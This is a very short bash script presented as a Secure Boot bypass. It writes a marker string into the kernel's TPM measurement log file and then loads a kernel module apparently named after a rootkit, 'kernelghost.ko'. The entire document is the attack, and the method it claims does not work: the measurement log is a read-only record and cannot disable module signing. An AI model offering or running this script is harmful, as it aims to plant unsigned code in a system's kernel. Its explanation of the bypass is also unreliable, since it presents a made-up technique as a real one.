#!/bin/bash
# Abuse Secure Boot memory injection to load unsigned modules
echo -n "KernelGhost" > /sys/kernel/security/tpm0/binary_bios_measurements
insmod ./kernelghost.ko